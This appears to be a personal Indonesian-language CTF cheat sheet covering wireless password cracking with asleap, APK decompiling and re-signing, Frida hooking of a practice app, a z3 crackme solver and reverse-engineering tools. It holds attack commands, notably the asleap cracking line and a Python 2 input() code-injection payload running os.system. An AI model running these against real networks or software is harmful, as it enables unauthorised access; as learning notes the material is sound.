+karena tipe data yg berbeda (string & array) jd rusak                                                                                                                                evil twin wpa attack WPA2-EAP (PEAP)
+gunakan tools asleap https://tools.kali.org/wireless-attacks/asleap untuk mendapat password dengan contoh command:
+asleap -C c3:ae:5e:f9:dc:0e:22:fb -R 6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0 -W rockyou.txt
+                                
+-C challenge value, -R response value, -W wordlist
+
+
+
+
+
+
+
+
+
+                                                
+ϱniɿɘɘniϱnɘ
+
+apk file: gunakan apktool untuk membuka isi dalam programnya &
+        jadx-gui untuk decompile programnya jadi java, cek bagian com
+
+apktool d [FILE.APK] untuk buka
+apktool b [FOLDER] untuk recompile, jika brut exception coba upgrade apktool dengan mengikuti:
+https://ibotpeaches.github.io/Apktool/install/
+
+output.apk akan ada di folder hasil decompile, di folder dist.
+
+setelah recompile, lakukan signing dengan:
+
+keytool -genkey -v -keystore ctf.keystore -alias ctf -keyalg RSA -keysize 2048 -validity 10000 (input bebas, ingat passphrase yg anda buat)
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ctf.keystore [out.apk] ctf
+
+zipalign -v 4 [out.apk] [result.apk]
+
+
+
+==setup frida windows emulator==
+install genymotion (butuh virtualbox), bikin virtual device
+pastikan adb sudah terpasang
+di cmd gunakan “adb devices” untuk melihat device yg udah terhubung
+pastikan frida-tools sudah diinstall, caranya pip install frida-tools
+download frida server di https://github.com/frida/frida/releases/, pilih yg sesuai sama arch devicenya
+gunakan command “adb push frida-server-15.1.14-android-x86 /data/local/tmp/frida-server” untuk memindahkan frida server yg udah di download ke device target. setelah itu di cmd gunakan “adb shell” untuk melihat shell dari device, cd ke /data/local/tmp, chmod +x frida-server, ./frida-server. dia akan listening
+gunakan command “frida-ps -Uai” untuk melihat semua proses di target device, contoh ada output seperti ini:
+
+
+ PID  Name                  Identifier
+----  --------------------  --------------------------------
+1680  Gallery               com.android.gallery3d
+1273  Phone                 com.android.dialer
+1764  Superuser             com.genymotion.superuser
+1985  Uncrackable1      owasp.mstg.uncrackable1
+
+menggunakan repository codeshare (https://codeshare.frida.re/) aesinfo untuk hook secar otomatis, commandnya “frida --codeshare dzonerzy/aesinfo -f owasp.mstg.uncrackable1 -U --no-pause”. ketika aplikasi dimasukkan input maka di cmd akan ternampak ltracenya
+
+
+kalo script bikin:
+frida -U -l /path/file-javascript-nya.js -f Nama.package.aplikasinya — no-pause
+*note = 
+windows environment variable
+C:\Users\crisd\AppData\Local\Android\Sdk\platform-tools
+install android studio to have sdk
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+handy tools:
+radare2
+ghidra
+ida
+uncompyle6 = pyc decompiler
+z3 solver: sebuah python module untuk mensolve sebuah program yg memiliki banyak constraint (nested if cthnya) – hacklabs 3.0
+from z3 import *
+s = Solver()
+a = [Int(i) for i in range(26)]
+s.add((2 * a[6]) == a[15] + 20)
+s.add((a[21] / 2) == (a[5] - 10))
+s.add(3 * (a[0] / 2) == a[16])
+s.add(2 * (a[2] + 3) == (a[21] + 30))
+s.add(7 * (a[1] / 5) == (a[11] - 4))
+s.add(13 * (a[3] / 15) == a[5])
+s.add((a[4] + 4 == a[18] - 15))
+s.add(a[5] == a[1])
+s.add(5 * (a[6] / 3) == (a[14] + 1))
+s.add((a[7] + 17) == (a[16] - 8) )
+s.add((a[8] - 3) / 2 == (a[22] + 3))
+s.add(a[9] / 2 == a[23] - 6)
+s.add(2 * a[10] - 1 == a[17] - 1)
+s.add((a[11] + 5) / 2 == a[9] - 40)
+s.add(2 * a[12] - 33 == a[14] - 9)
+s.add(3 * a[13] - 9 == a[25] - 5)
+s.add(4 * a[15] / 8 == a[1] - 9)
+s.add(((a[17] - 11) / 2) == a[5] - 20)
+s.add(a[18] == a[11])
+s.add((a[19] / 2) == (a[24] / 4) + 4)
+s.add((a[20] + 38) == a[9])
+print(s.check())
+print(s.model())
+if s.check() == sat:
+    c = s.model()
+    flagga = ''.join([chr(c[i].as_long()) for i in a])
+print(flagga)
+
+DnSpy = decompiling .NET framework, cek bagian {}
+untuk recompile, caranya klik kanan di sebuah class, lalu edit class, lalu ubah codingannya.
+kalau sudah, klik compile, lalu klik kanan file besarnya, lalu save module. 
+upx = unpack executable, caranya upx -d [APP]
+
+bypassing ptrace(anti gdb):
+https://dev.to/nuculabs_dev/bypassing-ptrace-calls-with-ldpreload-on-linux-12jl
+
+solving movfuscator
+https://dustri.org/b/defeating-the-recons-movfuscator-crackme.html
+
+pawon
+
+
+python 2.7 + vulnerability
+correct = randint(1, 999999)
+print("Tebak Nomor : ")
+question = input("")
+if question == correct:
+     print("ketemu")
+else:
+     print("Salah”)
+
+masukkan “correct” sebagai input dan dia akan menganggapnya true.
+
+__import__('os').system('ls') ketika diminta inputan langsung dgn input()
+
+-rop = gunakan ropstar
+DOCKTER
+
+
+jalankan ./build.sh
+lalu docker-compose up -d
+dan docker ps
+
+nanti di bagian port ada yg up, bisa dilakukan nc
